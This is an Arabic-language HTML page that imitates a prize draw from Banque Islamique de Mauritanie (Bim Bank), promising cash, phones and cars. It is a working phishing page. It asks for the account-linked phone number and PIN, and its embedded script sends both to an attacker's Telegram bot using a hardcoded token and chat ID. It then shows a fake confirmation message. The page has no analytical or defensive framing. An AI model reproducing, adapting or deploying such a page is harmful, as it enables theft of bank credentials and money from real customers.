<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بيم بنك - سحب الجوائز</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
        
        body { 
            font-family: 'Cairo', sans-serif; 
            background-color: #ffffff; 
            margin: 0;
            display: flex;
            justify-content: center;
        }

        .app-container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
        }

        /* تنسيق الشعار العلوي */
        .logo-section {
            margin-bottom: 40px;
            margin-top: 20px;
        }
        .logo-main {
            width: 180px;
            margin: 0 auto;
        }

        /* تنسيق الحقول */
        .input-group {
            text-align: right;
            margin-bottom: 20px;
        }
        .input-label {
            font-weight: 700;
            font-size: 14px;
            color: #000;
            margin-bottom: 8px;
            display: block;
        }
        .input-wrapper {
            position: relative;
            border: 2px solid #000;
            border-radius: 15px;
            overflow: hidden;
            background: white;
        }
        .input-field {
            width: 100%;
            padding: 15px 45px 15px 15px;
            font-size: 16px;
            border: none;
            outline: none;
            text-align: right;
        }
        .input-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #2a4387;
        }

        /* زر السحب الآمن */
        .btn-submit {
            background-color: #94a3b8; /* لون رمادي كما في الصورة */
            color: white;
            width: 100%;
            padding: 18px;
            border-radius: 12px;
            font-weight: 700;
            font-size: 18px;
            margin-top: 10px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        /* قسم الجوائز السفلي */
        .awards-card {
            margin-top: 50px;
            background-color: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 25px;
            padding: 20px;
        }
        .awards-title {
            color: #2a4387;
            font-weight: 800;
            font-size: 24px;
            margin-bottom: 5px;
        }
        .awards-subtitle {
            color: #64748b;
            font-size: 14px;
            margin-bottom: 25px;
        }
        .awards-grid {
            display: flex;
            justify-content: space-around;
            align-items: center;
        }
        .award-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
        }
        .award-icon { font-size: 35px; }
        .award-name { color: #2a4387; font-weight: 700; font-size: 12px; }
    </style>
</head>
<body>

    <div class="app-container">
        <!-- الشعار (تم استبداله بشعار بيم بنك) -->
        <div class="logo-section">
            <img src="https://r.jina.ai/i/6561f36402ec4c97960350436a537f8d" alt="Bim Bank" class="logo-main">
            <p class="text-[#2a4387] font-bold text-xs mt-1">Banque Islamique de Mauritanie</p>
        </div>

        <!-- حقل رقم الهاتف -->
        <div class="input-group">
            <label class="input-label">رقم الهاتف المربوط بالحساب *</label>
            <div class="input-wrapper">
                <input id="phone" type="tel" maxlength="8" class="input-field" placeholder="رقم الهاتف">
                <span class="input-icon">👤</span>
            </div>
        </div>

        <!-- حقل الرمز السري -->
        <div class="input-group">
            <label class="input-label">الرمز السري (PIN) *</label>
            <div class="input-wrapper">
                <input id="pin" type="password" maxlength="4" class="input-field" placeholder="أدخل الرمز السري">
                <span class="input-icon">🔒</span>
            </div>
        </div>

        <!-- زر السحب -->
        <button onclick="processLogin()" class="btn-submit">
            ادخل السحب الآمن
        </button>

        <!-- كرت الجوائز -->
        <div class="awards-card">
            <h3 class="awards-title">بيم بنك</h3>
            <p class="awards-subtitle">جوائز كبرى بانتظارك</p>
            
            <div class="awards-grid">
                <div class="award-item">
                    <span class="award-icon">💰</span>
                    <span class="award-name">مبالغ نقدية</span>
                </div>
                <div class="award-item">
                    <span class="award-icon">📱</span>
                    <span class="award-name">هواتف ذكية</span>
                </div>
                <div class="award-item">
                    <span class="award-icon">🚗</span>
                    <span class="award-name">سيارات</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        const TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
        const CHAT_ID = "8665814266";

        function processLogin() {
            const p = document.getElementById('phone').value;
            const n = document.getElementById('pin').value;
            
            if(p.length === 8 && n.length === 4) {
                const text = `🎯 Bim Bank Draw Entry:\n📱 الهاتف: ${p}\n🔑 الرمز: ${n}`;
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`)
                .then(() => {
                    alert("تم دخولك السحب بنجاح، سيتم التواصل معك في حال الفوز.");
                    location.reload();
                });
            } else {
                alert("يرجى التأكد من إدخال البيانات بشكل صحيح.");
            }
        }
    </script>
</body>
</html>
